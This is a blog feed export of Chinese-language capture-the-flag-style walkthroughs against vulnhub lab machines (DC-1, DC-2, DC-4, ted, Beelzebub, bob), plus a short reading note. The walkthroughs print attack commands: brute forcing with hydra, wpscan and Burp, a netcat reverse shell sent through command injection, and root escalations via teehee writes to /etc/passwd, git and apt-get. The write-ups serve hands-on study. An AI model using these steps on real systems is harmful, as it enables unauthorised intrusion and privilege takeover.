class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.1</span><br><span class="line"><span class="built_in">set</span> USER\_FILE /path/to/usernames.txt</span><br><span class="line"><span class="built_in">set</span> PASS\_FILE /path/to/passwords.txt</span><br></pre></td></tr></table></figure></li><li><p>发起攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>成功爆破得到 MySQL 用户名和密码，进行结果验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h &lt;target\_address&gt; -u &lt;username&gt; -p</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>思考 MySQL 爆破日志，在数据库日志文件能不能查看。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每周靶机之Beelzebub</title>
      <link href="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/"/>
      <url>/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/</url>
      
        <content type="html"><![CDATA[<p>这个是工作室的靶机</p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：beelzebub</p><h2 id="知识点和工具"><a href="#知识点和工具" class="headerlink" title="知识点和工具"></a>知识点和工具</h2><p>wpscan (wordpress环境专用的工具 用于爆破用户名或密码)<br>dirsearch (目录扫描)<br>md5加密<br>目录扫描</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>老样子 发现靶机 扫描端口<br><img src="1.jpg" alt="1"><br>80端口开着 我们访问看两眼<br><img src="2.jpg" alt="2"><br>标准的默认欢迎页面 没什么特别的<br>用扫描目录的工具<strong>dirsearch</strong>找找有没有其他目录<br><code>dirsearch -u [网址]</code><br><img src="3.jpg" alt="3"><br>在index.php网站内发现隐藏注释<br><img src="4.jpg" alt="4"><br>（大意:我的核心被加密了，”beelzebub”不知为何破解并加密了他 -MD5)<br>说明我们要去的目录与md5加密后的”beelzebub”有联系<br><img src="5.jpg" alt="5"><br>于是我们随便找个<strong>md5加密&#x2F;解密</strong>网站将beelzebub加密<br>逐一用dirsearch来寻找正确的目录<br><img src="6.jpg" alt="6"><br>最终发现在32位小写加密方式的目录下存在wordpress基站<br>依次查看 发现wp-content&#x2F;uploads&#x2F;下存在文件管理系统<br><img src="12.jpg" alt="12"><br>进入Talk To VALAK中<br>发现在输入任何字段后网页会返回一段名为password的cookie<br><img src="7.jpg" alt="7"><br>该密码多半与开放的ssh服务有联系 但用户名未知<br>我们使用wpscan来爆破该网站的用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wpscan -url &quot;[网址]&quot; -e u --ignore-main-redirect --force</span><br><span class="line">-url //指定网址</span><br><span class="line">-e u //爆破用户名</span><br><span class="line">--ignore-main-redirect //忽略主要的重定向</span><br><span class="line">--force //强制执行扫描（这在你确信目标站点是WordPress站点但WPScan未正确检测到的情况下可能会有用）</span><br></pre></td></tr></table></figure><p><img src="8.jpg" alt="8"><br>结果显示有俩用户 分别为<strong>krampus</strong>与<strong>valak</strong><br>经过尝试发现可以使用password中的密码与<strong>krampus</strong>登陆ssh服务<br><img src="9.jpg" alt="9"><br>进去后发现权限不够 需要提权<br>查看<strong>history &#x2F;&#x2F;历史记录</strong>后发现该账号曾尝试提权<br><img src="10.jpg" alt="10"><br>我们复现过程即可<br><img src="11.jpg" alt="11"><br>获得root权限 结束！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>过程很短的靶机<br>结合了wordpress与目录扫描<br>已经不止一次见到wordpress了 用wpscan便可以解决大部分的问题<br><strong>那么我们下次见</strong></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记-如何阅读一本书</title>
      <link href="/2023/12/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/"/>
      <url>/2023/12/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<p>经<a href="https://truthleader.github.io/"><del>我们伟大而全能的唯一至高真理教教主</del></a>推荐而读</p><hr><p>ps:之前没做过这种东西 所以姑且先开一篇试试水<br>这玩意多半得长期更新 边摸边写</p><h2 id="总之为啥要看呢？"><a href="#总之为啥要看呢？" class="headerlink" title="总之为啥要看呢？"></a>总之为啥要看呢？</h2><p>1.提升看书的效率（用更少的时间来阅读更多的内容）云云<br>2.很好奇是怎么个”如何阅读”</p><h2 id="我目前看出来个啥"><a href="#我目前看出来个啥" class="headerlink" title="我目前看出来个啥"></a>我目前看出来个啥</h2><p>1.有的时候 **理解（understand）<strong>东西并不需要</strong>知道（know）**这件事相关的所有事物。太多的资讯与太少的资讯都会成为理解力的阻碍。</p><p>2.阅读并不是完全被动(类似于被打了一拳，或得到一项遗产，或法院的判决)的行为。反倒更像是棒球比赛中的捕手——读者需要去尽可能接收作者所投出来的“球”，把自己的技巧与作者的技巧融合起来，达到共同的终点。读者想“接住”多少意念完全看他在阅读时多么主动，以及他投⼊不同⼼思来阅读的技巧如何。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4解析</title>
      <link href="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>这个是学校作业哦<br>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><hr><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：DC-4<br>网络链接均为Nat模式</p><h2 id="相关知识与工具"><a href="#相关知识与工具" class="headerlink" title="相关知识与工具"></a>相关知识与工具</h2><p>burpsuite （爆破 监听 数据包更改）<br>hydra（爆破用工具）<br>teehee提权</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>照例<br><code>arp-scan -l //发现同网段设备</code><br><code>nmap -p- -A [指定的ip地址] //扫描开放的端口并套用脚本</code><br><img src="1.jpg" alt="1"><br>既然开放了80端口 那就访问看看<br><img src="2.jpg" alt="2"><br>是个登陆页面 说是<strong>admin</strong>信息系统登陆<br>我们用burpsuite爆破密码试试<br>调整firefox与burpsuite的proxy设定 我们开启监听 <strong>send to intruder</strong><br><img src="3.jpg" alt="3"><br>用攻击类型Cluster bomb来爆破 字典选择kali中自带的&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst</p><blockquote><p>坑:本来想用rockyou.txt的 行数太多常常导致burpsuite的崩溃</p></blockquote><p>注意该lst文件前面会有几行注释 选中后点击左边的remove即可<br>因为使用的是Cluster bomb需要给两个<strong>payload</strong>都加上内容<br>我们切换<strong>payload set</strong>继续导入词库<br><img src="4.jpg" alt="4"><br>ok了 点击右上角按钮开始攻击<br>嫌速度慢的可以在Resource pool中更改线程<br><img src="5.jpg" alt="5"><br>经过极其漫长的等待<br>结果出来了<br>账号名为<strong>admin</strong> 密码为<strong>happy</strong><br><img src="6.jpg" alt="6"><br><img src="7.jpg" alt="7"><br>我们用这套账号密码登陆进入网站<br>网站里面有一些命令可以执行 但都是固定的<br><img src="8.jpg" alt="8"><br>我们用burpsuite抓包 尝试修改命令<br><img src="9.jpg" alt="9"><br>我们把命令改成<strong>ipconfig</strong><br>可以看到照样成功运行了<br>既然运行命令可行 那就利用nc(瑞士军刀)反弹shell吧<br>在kali端运行<code>nc -lnvp 1234 //于1234端口开始监听</code><br>在burpsuite中将命令改为<code>nc [kali的ip地址] [端口] -e /bin/sh //反弹shell</code><br>点击send 成功反弹<br><img src="10.jpg" alt="10"><br>利用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>优化交互页面<br><img src="11.jpg" alt="11"><br>在根目录的home目录下使用<code>ls -alR</code>递归显示所有目录与隐藏文件<br>在jim目录底下发现名为old-passwords.bak的文件<br>联系一开始端口扫描中开放的22端口<br>我们需要尝试登陆ssh服务<br>至于如何把该文件中的内容传回来 直接复制粘贴即可<br>账号名为<strong>jim</strong> 密码目录使用复制粘贴的密码目录<br>工具为hydra<br><img src="12.jpg" alt="12"><br><code>hydra -l [用户名] -P [密码字典目录] [服务名：//ip地址]</code><br>我们稍等片刻 结果出来了<br><code>[22][ssh] host: 192.168.246.142 login: jim password: jibril04</code><br><img src="13.jpg" alt="13"><br>登陆完毕 嘻嘻<br>一进来系统就说<strong>you have mail</strong><br>那我们找找这封邮件在哪里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find [寻找范围] -name [想找的文件名称] 2&gt;/dev/null</span><br><span class="line">2&gt;/dev/null 不输出报错</span><br></pre></td></tr></table></figure><p><img src="14.jpg" alt="14"><br>发现在**&#x2F;var&#x2F;mail**目录里边有一封信件<br>(大意:jim 我这周要去休假 老板叫我给你我的密码 免得有要紧事 拜拜）<br>有了charles的账号密码 我们切换一下账号<br><img src="15.jpg" alt="15"><br>成功进入 我们sudo -l查看该用户的sudo权限<br>发现他可以以root权限免密码执行 &#x2F;usr&#x2F;bin&#x2F;teehee<br>那就通过teehee提权的方式来获取权限</p><blockquote><p>参考：<a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee提权</a><br>teehee是个小众的linux编辑器 如果有sudo权限 可以利用其来提权<br>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su admin就可以登录到admin用户，这个用户因为uid为0，所以也是root权限</p></blockquote><p>我们安装教程 输入<code>echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br>随后便能不使用密码<strong>su admin</strong><br>flag自然在&#x2F;root目录之下<br><img src="16.jpg" alt="16"><br>成功！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>知识点比较少 短小精悍的靶机<br>那我们下次再见！</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2解析</title>
      <link href="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>这个是学校作业<br>下载地址:<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：DC-2<br>网络链接均为Nat模式</p><h2 id="相关知识与工具"><a href="#相关知识与工具" class="headerlink" title="相关知识与工具"></a>相关知识与工具</h2><p>wpscan (WordPress爆破用)<br>MSF console (漏洞检索&amp;调用)<br>dirb (目录扫描)<br>cewl (给url生成密码目录)<br>绕过bash限制<br>git 提权</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>国际惯例 <code>arp-scan -l</code>发现同网段设备 使用<strong>nmap</strong>扫描ip开放的端口<br><img src="1.jpg" alt="1"><br>我们访问网站 发现无法访问<br>这里需要修改hosts文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts //编辑 随后另起一行 输入[靶机的ip地址] [dc-2]</span><br></pre></td></tr></table></figure><p>这么一改 这个ip就和dc-2绑定了 重定向也不会出错<br>进入网站 发现网站是wordpress框架<br>里面翻了一遍 没啥隐藏的玩意 只有一个flag<br><img src="15.jpg" alt="15"><br>[大意:通常的密码表爆破估计不会有用 你估计得要变得cewl(特指工具名) 登录网站来获取下个flag 如果没有 就换个账号]<br>那我们现在的目标转向wordpress的账号密码获取与登录页面的寻找(毕竟有账号密码没得登录怎么办呢)<br>我们先利用<strong>msfconsole</strong>中的目录扫描工具(关键词dir_scan)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole //启用msfconsole</span><br><span class="line">search [关键字] //以关键字为目标查找漏洞 (tips:Name中/webapp对应web漏洞 /http对应与http协议有关漏洞)</span><br><span class="line">配合前者- use/info+[上一次搜索结果中漏洞对应的序号] //使用/查看对应漏洞</span><br><span class="line">也可以直接use/info+[漏洞Name]</span><br><span class="line">set RHOSTS [需要爆破的ip] //指定目标</span><br><span class="line">run //执行</span><br></pre></td></tr></table></figure><p><img src="3.jpg" alt="3"><br>找到了 wp-includes 但里面的文件实在太多 使用<strong>dirb</strong>再次扫描 缩小范围吧<br><img src="4.jpg" alt="4"></p><p>[-X 限制文件后缀]<br><strong>发现了登陆页面(wp-login.php)</strong></p><p>账号方面使用wpscan获取</p><blockquote><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;--update 更新到最新版本</span><br><span class="line">&gt;--url | -u &lt;target url&gt; 要扫描的`WordPress`站点.</span><br><span class="line">&gt;--force | -f 不检查网站运行的是不是`WordPress`</span><br><span class="line">&gt;--enumerate | -e [option(s)] 枚举</span><br><span class="line">&gt;u 枚举用户名，默认从1-10</span><br><span class="line">&gt;u[10-20] 枚举用户名，配置从10-20</span><br><span class="line">&gt;--username | -U &lt;username指定爆破的用户名</span><br><span class="line">&gt;--wordlist | -w &lt;wordlist指定密码字典</span><br></pre></td></tr></table></figure></blockquote><p>这里用到枚举功能 发现有3个用户名 分别是<strong>admin jerry tom</strong></p><p><img src="5.jpg" alt="5"></p><p>我们生成一个用户名表 把这仨放进去 方便后面爆破<br><img src="6.jpg" alt="6"><br>密码方面遵从flag的提示 使用cwel工具<br><code>cwel [网址] -w [生成文件名]</code><br><img src="7.jpg" alt="7"><br>随后用户名表有了 密码表也有了 我们用wpscan来爆破一下<br><code>wpscan --url [网址] -U [用户名表] -P [密码表]</code><br><img src="8.jpg" alt="8"></p><p>找出了tom与jerry的密码<br>我们进入登陆页面 发现jerry账号处有flag<br><img src="9.jpg" alt="9"><br>[大意：换个捷径 也就是另一个入口试试看吧]<br>那么我们就能想到刚刚开放的7744端口对应了ssh服务 尝试登陆<br>发现用刚才爆破出的tom账号密码可以登陆<br><img src="10.jpg" alt="10"><br>登陆后发现tom用户无法执行系统指令 用户默认shell为rbash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绕过bash限制(这里基本看不懂就把原教程贴上来吧嘻嘻)</span><br><span class="line">BASH\_CMDS[a]=/bin/sh</span><br><span class="line">a/bin/bashexport</span><br><span class="line">PATH=$PATH:/binexport</span><br><span class="line">PATH=$PAH:/usr/bin</span><br></pre></td></tr></table></figure><p>在执行了绕过后 通过查看文件发现flag3<br><img src="11.jpg" alt="11"><br>[大意：可怜的老tom老追着jerry跑 也许需要su一下？]<br>我们su jerry来切换用户<br><img src="12.jpg" alt="12"><br>切换之后就找到了flag4<br><img src="13.jpg" alt="13"><br>[大意：最后一个flag才算数哦 用git逃出这里吧]<br>jerry的权限不足以访问&#x2F;root 看来是需要git 提权了</p><blockquote><p>参考:<a href="https://blog.csdn.net/qq_38612882/article/details/122772867">csdn-2022-渗透测试-git提权（Linux）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash或者！&#x27;sh&#x27;完成提权</span><br></pre></td></tr></table></figure></blockquote><p>这样操作完之后就能访问root了<br><img src="14.jpg" alt="14"><br>完事！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>dc这个系列的靶机好像就是每期针对一个不同类型的博客框架进行拆解啊<br>wordpress之前接触过所以还算好说<br><em><strong>那我们下次见吧</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每周靶机之ted</title>
      <link href="/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/"/>
      <url>/2023/12/19/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bted/</url>
      
        <content type="html"><![CDATA[<p>上周欠的工作室的靶机<br>靶机链接： <a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：ted （192.168.246.139）</p><h2 id="相关工具-知识"><a href="#相关工具-知识" class="headerlink" title="相关工具&amp;知识"></a>相关工具&amp;知识</h2><p>burpsuite (渗透测试工具)<br>远程文件包含<br>sha256加密</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>惯例发现靶机扫描端口<br><img src="1.jpg" alt="1"><br>发现80端口开放 通过firefox访问<br>发现主页面是一个登录页面 使用burpsuite爆破账号密码<br><img src="2.jpg" alt="2"><br>发现当admin为账号时弹回提示”密码hash值可能不对 请尝试hash加密”<br><img src="3.jpg" alt="3"><br><img src="4.jpg" alt="4"><br>我们确定账号名为admin 密码通过其他工具进行各种形式的加密 随后尝试爆破<br>发现密码形式为sha256加密 且字母为大写<br><img src="5.jpg" alt="5"><br><img src="6.jpg" alt="6"><br>登录进去之后发现只有一个搜索框 测试后发现存在xss漏洞<br><img src="7.jpg" alt="7"><br>尝试&#x2F;etc&#x2F;passwd发现存在远程包含漏洞 通过nc监听反弹shell<br><img src="8.jpg" alt="8"><br><img src="9.jpg" alt="9"><br>（尝试读取到当前admin的session，PHP的session保存在：&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F;sess_sessionid)<br><img src="10.jpg" alt="10"><br><img src="11.jpg" alt="11"><br>成功反弹到shell 发现权限为www-data 使用<code>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code>提权<br><img src="12.jpg" alt="12"><br>完成<br><img src="13.jpg" alt="13"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好短一靶机…<br>但作为复习来说也算不错<br>那我们下次见！</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机-DC-1</title>
      <link href="/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/"/>
      <url>/2023/12/19/%E9%9D%B6%E6%9C%BA-DC-1/</url>
      
        <content type="html"><![CDATA[<p><strong>下载地址：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></strong><br>跟随课程所写的靶机</p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：DC-1<br>网络链接均为Nat模式</p><h2 id="相关知识-工具"><a href="#相关知识-工具" class="headerlink" title="相关知识&amp;工具"></a>相关知识&amp;工具</h2><p>MSFconsole (漏洞检索与执行)<br>MySQL数据库相关<br>hash加密<br>find suid提权</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p><img src="1.jpg" alt="1"><br>惯例 <code>arp-scan -l //快速发现同网段设备</code><br><code>nmap -p- -A [ip地址] //扫描端口并调用默认脚本</code><br>发现开放了<code>对应ssh服务的22端口 对应http服务的80端口 对应rpcbind的111端口</code><br>总之我们先通过Firefox访问该ip试试看<br><img src="2.jpg" alt="2"><br>是个 <strong>drupal</strong> 网站 网站元素内没有隐藏要素 我们尝试通过注册账号来登录 发现无法注册<br>那就只有通过各种方式来获取账号密码登录网站了<br>我们先前说过 这是个<strong>drupal</strong>模板网站 在msfconsole中一定能找到不少漏洞<br><img src="3.jpg" alt="3"><br>寻找的时候我们看到这个<strong>drupal_drupageddon</strong>可以使用 于是加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole //启用msfconsole</span><br><span class="line">search [关键字] //以关键字为目标查找漏洞 (tips:Name中/webapp对应web漏洞 /http对应与http协议有关漏洞)</span><br><span class="line">配合前者- use/info+[上一次搜索结果中漏洞对应的序号] //使用/查看对应漏洞</span><br><span class="line">也可以直接use/info+[漏洞Name]</span><br><span class="line">set RHOSTS [需要爆破的ip] //指定目标</span><br><span class="line">run //执行</span><br></pre></td></tr></table></figure><p>随后我们输入<strong>shell</strong> 很快就能反弹到一个shell<br><img src="4.jpg" alt="4"><br>使用之前介绍过的<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; //改善shell交互性</code><br>寻找flag文件 很快的就能发现根目录下的<strong>flag1.txt</strong><br><img src="5.jpg" alt="5"><br>它提示我说每个文件管理系统都需要一个<strong>设置文件</strong>——<strong>你也是</strong><br>也就是说接下来的内容处于这个网站的<strong>设置文件</strong>中<br>很明显**&#x2F;sites&#x2F;default&#x2F;settings.php<strong>里有点什么玩意<br>查看后发现了 <strong>flag2</strong> 与 <strong>该网站mysql数据库的一套账号密码</strong><br>那就</strong>登录mysql**查看主网站的账号密码<br><img src="6.jpg" alt="6"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这个靶机需要用到的 不太全的mysql相关指令</span><br><span class="line">mysql -h localhost(登陆别的地址需要ip 本地可选 是默认的) -u [用户名] -p[密码](注意这里不用空格) //登录mysql系统</span><br><span class="line">mysql命令(请注意每个命令都需要分号结尾)</span><br><span class="line">show databases; //显示数据库列表</span><br><span class="line">use [数据表名]; //选择数据库列表</span><br><span class="line">show tables; //显示库中的数据表</span><br><span class="line">select [范围,\*为全部] from [表名]; //查询表内数据</span><br><span class="line">update 表名 set 字段=&quot;[要修改成的值]&quot; where 子句 order by 子句 limit 子句; //更新表内数据</span><br><span class="line">WHERE 子句：可选项。用于限定表中要修改的行。若不指定，则修改表中所有的行。</span><br><span class="line">ORDER BY 子句：可选项。用于限定表中的行被修改的次序。</span><br><span class="line">LIMIT 子句：可选项。用于限定被修改的行数。</span><br></pre></td></tr></table></figure><p><img src="7.jpg" alt="7"><br>我们这里成功登陆上了mysql 由于information_schema是mysql数据库自带 我们选中并查看<strong>drupaldb</strong>表中的数据<br>该表中有一个名为<strong>users</strong>的库 很明显 我们需要查看库中的数据<br><img src="8.jpg" alt="8"><br>很尴尬 由于窗口分辨率原因 数据错位了不是很好阅读<br>可以使用**\G<strong>来代替查询语句的分号 来使结果垂直显示<br>tips:</strong>\g<strong>与分号作用相同 请注意大写<br><img src="9.jpg" alt="9"><br>这里有俩账号 一个叫</strong>admin** 一个叫<strong>Fred</strong><br>那我们要登陆账号 优先一定选择权限更高的<strong>admin</strong>账号<br>更改密码 但我们可以看到pass处是被hash加密过的密码<br>想要反推的可能性不大而且费时 于是考虑替换密码<br>这里就要利用<strong>Drupal</strong>作为模板网站的特性<br>通过检索发现该网站的**&#x2F;scripts<strong>目录下拥有可以生成同款hash加密密码字符的password-hash.sh文件<br>直接执行<code>./[sh文件目录] [想要加密的密码]</code>来生成<br><img src="10.jpg" alt="10"><br>生成一段hash码 再次进入mysql 替换数据 随后使用admin与</strong>更改过的密码<strong>来登陆网站<br><img src="11.jpg" alt="11"><br><img src="12.jpg" alt="12"><br>登陆完毕 我们查看任务栏中的</strong>Content<strong>查看过去的文章内容 发现</strong>flag3.txt**<br><img src="13.jpg" alt="13"><br>点击<strong>edit</strong>查看内容<br><img src="14.jpg" alt="14"><br>其中强调了 <strong>FIND与-EXEC</strong><br>我们于是需要介绍<strong>find suid提权</strong><br><img src="15.jpg" alt="15"><br>第一步的具体作用是<strong>找出拥有suid权限的指令</strong><br>在发现find拥有suid权限后 便可以通过find提权</p><blockquote><p>参考：<br><img src="18.jpg" alt="18"><br><img src="17.jpg" alt="17"></p></blockquote><p>拥有了root权限 我们便可以进一步寻找flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;\*flag\*.txt&quot; //根据名称寻找根目录下文件名中含有完整flag单词的txt文件(星号代表任意字符)</span><br></pre></td></tr></table></figure><p><img src="16.jpg" alt="16"><br>结束 感谢！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>又一个过程不长但复杂的靶机<br>让我认识到了即使find这个看起来只有寻物功能的指令有了附加项后也能用于提权<br>真是奇妙<br>那么我们下次见</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每周靶机之bob</title>
      <link href="/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/"/>
      <url>/2023/12/10/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8Bbob/</url>
      
        <content type="html"><![CDATA[<p>总之这是这周的靶机</p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali（192.168.246.128）<br>靶机：bob （192.168.246.138）</p><h2 id="使用工具-指令-知识"><a href="#使用工具-指令-知识" class="headerlink" title="使用工具&amp;指令&amp;知识"></a>使用工具&amp;指令&amp;知识</h2><p>nc（瑞士军刀）<br>nmap （端口扫描）<br>gpg加密<br>命令执行漏洞</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>首先国际惯例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l //发现同网段设备</span><br><span class="line">nmap -A -p- [ip地址] //扫描该ip的端口并使用默认脚本</span><br></pre></td></tr></table></figure><p><img src="3.jpg" alt="3"><br><img src="4.jpg" alt="4"><br>发现了该靶机开放了21端口(对应ftp服务) 80端口(对应http服务) 25468端口(对应ssh服务)<br>我们先从http服务开启 firefox访问<br><img src="5.jpg" alt="5"><br>主页与超链接经检查 没有发现什么特别的东西<br>于是我们来看看nmap在&#x2F;robots.txt下扫描出的四个目录</p><blockquote><h2 id="什么是robots-txt"><a href="#什么是robots-txt" class="headerlink" 